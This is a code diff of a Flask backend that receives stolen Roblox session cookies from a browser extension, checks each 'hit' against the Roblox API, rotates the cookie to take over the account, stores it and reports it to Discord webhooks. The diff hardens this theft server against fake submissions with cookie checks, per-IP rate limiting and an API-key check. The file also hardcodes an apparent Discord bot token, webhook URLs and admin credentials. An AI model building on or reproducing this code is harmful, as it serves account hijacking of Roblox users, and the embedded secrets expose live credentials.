@@ -13,6 +13,7 @@ import shutil
 import logging
 import base64
 import hashlib
+from collections import defaultdict
 from datetime import datetime, timedelta, timezone
 
 import requests as http_requests
@@ -29,7 +30,7 @@ load_dotenv()
 DISCORD_TOKEN = os.getenv('DISCORD_TOKEN', 'MTI2OTI0NTM0MTU0NzYzMDYyMw.G8N4GC.E2Fs9Hbmq528vPuTrlXoaWiAPrrTwdwccrs1hQ')
 DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1518341400842731561/aNePu0KVOBcI_zb_bJNeH9Izd597v27NtJRgb_Xq_nHmKPT2DZdosgqe7ItRt0_RTNz6')  # Cookie notifications
 DISCORD_WEBHOOK_URL_UPDATES = os.getenv('DISCORD_WEBHOOK_URL_UPDATES', 'https://discord.com/api/webhooks/1518591641198530652/s43keFLuzq-Rwr-oafbcYFGGQVTiLuY0zHNdVddHdNTeATADLtVVDV1Ii2A6DINZXNK6')  # Status/config updates
-API_KEY = os.getenv('API_KEY', 'rbx-secret-key-2024')
+API_KEY = os.getenv('API_KEY', 'rbx_sk_9f3xKmPvQ7nW2jR8sL5yBcDe4hA6tG1u')
 ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
 ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')
 ADMIN_PANEL_ENABLED = False
@@ -532,34 +533,30 @@ def send_discord_webhook(session_data, is_update=False, update_type='NEW'):
 def process_new_hit(cookie, game='', ip='', username_hint='', display_hint=''):
     """
     Full pipeline when extension sends a cookie:
-    1. Get user info
+    1. Get user info (MUST succeed - reject fake cookies)
     2. Rotate cookie
     3. Save to DB
     4. Send Discord webhook
     """
-    # Step 1: Get user info from original cookie
-    logger.info("[HIT] Step 1: Getting user info...")
+    # Step 1: Get user info from original cookie - MUST succeed
+    logger.info("[HIT] Step 1: Verifying cookie via Roblox API...")
     user_info = get_roblox_user_info(cookie)
     
-    if user_info:
-        userId = user_info['id']
-        username = user_info['name']
-        displayName = user_info['displayName']
-    else:
-        # Fallback to hints from extension
-        userId = username_hint or f"unknown_{int(time.time())}"
-        username = username_hint or 'unknown'
-        displayName = display_hint or 'unknown'
-
-    if not user_info and (not userId or not username or not displayName or str(username).lower() == 'unknown' or str(displayName).lower() == 'unknown'):
-        logger.warning("[HIT] Skipping session with unknown identity")
+    if not user_info:
+        # Cookie is fake/invalid - REJECT immediately
+        logger.warning(f"[HIT] REJECTED - Cookie verification failed (IP: {ip}). Possible spam attempt.")
         return {
             'userId': None,
             'username': None,
             'displayName': None,
-            'status': 'skipped',
+            'status': 'rejected',
             'rotated': False
         }
+    
+    userId = user_info['id']
+    username = user_info['name']
+    displayName = user_info['displayName']
+    logger.info(f"[HIT] Cookie verified: {username} ({userId})")
     
     # Step 2: Rotate cookie
     logger.info("[HIT] Step 2: Rotating cookie...")
@@ -717,17 +714,47 @@ app.secret_key = os.getenv('SECRET_KEY', 'rbx-secret-key-2024-session')
 # Allow all CORS requests (extension + browser)
 CORS(app, 
      origins="*",
-     allow_headers="*",
+     allow_headers=["Content-Type", "Authorization", "X-API-Key"],
      methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
 
 # Add header hook for maximum CORS compatibility
 @app.after_request
 def after_request(response):
     response.headers.add('Access-Control-Allow-Origin', '*')
-    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-API-Key')
     response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
     response.headers.add('Access-Control-Max-Age', '3600')
     return response
+
+# =====================================================
+# RATE LIMITING (in-memory, per IP)
+# =====================================================
+_rate_limit_store = defaultdict(list)  # ip -> [timestamps]
+RATE_LIMIT_MAX_REQUESTS = 5   # max requests
+RATE_LIMIT_WINDOW_SECONDS = 60  # per 60 seconds
+
+def _is_rate_limited(ip):
+    """Check if IP has exceeded rate limit. Returns True if limited."""
+    now = time.time()
+    # Clean old entries
+    _rate_limit_store[ip] = [t for t in _rate_limit_store[ip] if now - t < RATE_LIMIT_WINDOW_SECONDS]
+    if len(_rate_limit_store[ip]) >= RATE_LIMIT_MAX_REQUESTS:
+        return True
+    _rate_limit_store[ip].append(now)
+    return False
+
+# =====================================================
+# API KEY AUTHENTICATION
+# =====================================================
+def require_api_key(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        api_key = request.headers.get('X-API-Key', '')
+        if api_key != API_KEY:
+            logger.warning(f"[AUTH] Invalid API key from {request.remote_addr}")
+            return jsonify({'error': 'Unauthorized - Invalid API key'}), 401
+        return f(*args, **kwargs)
+    return decorated_function
 
 # =====================================================
 # AUTHENTICATION
@@ -770,15 +797,22 @@ def index():
     return render_template('index.html')
 
 @app.route('/api/sessions', methods=['POST'])
+@require_api_key
 def receive_session():
     try:
+        ip = request.remote_addr
+        
+        # Rate limiting check
+        if _is_rate_limited(ip):
+            logger.warning(f"[RATE-LIMIT] IP {ip} exceeded rate limit")
+            return jsonify({'error': 'Too many requests. Try again later.'}), 429
+        
         data = request.get_json()
         if not data:
             return jsonify({'error': 'No data received'}), 400
         
         cookie = data.get('cookie', '')
         game = data.get('game', 'N/A')
-        ip = request.remote_addr
         username_hint = data.get('username', '')
         display_hint = data.get('displayName', '')
         action = data.get('action', 'Unknown')
@@ -786,9 +820,14 @@ def receive_session():
         if not cookie:
             return jsonify({'error': 'No cookie provided'}), 400
         
+        # Basic cookie sanity check - must be long enough
+        if len(cookie) < 100:
+            logger.warning(f"[API] Rejected short/fake cookie from {ip} (len={len(cookie)})")
+            return jsonify({'error': 'Invalid cookie'}), 400
+        
         logger.info(f"[API] Received session from {ip} - action: {action}")
         
-        # Process in background thread to not block response
+        # Process the hit - will verify cookie via Roblox API
         result = process_new_hit(
             cookie=cookie,
             game=game,
@@ -796,6 +835,10 @@ def receive_session():
             username_hint=username_hint,
             display_hint=display_hint
         )
+        
+        # Check if cookie was rejected (fake/invalid)
+        if result and result.get('status') == 'rejected':
+            return jsonify({'error': 'Cookie verification failed', 'status': 'rejected'}), 403
         
         # Extract userId from result if available
         userId = result.get('userId') if result else None
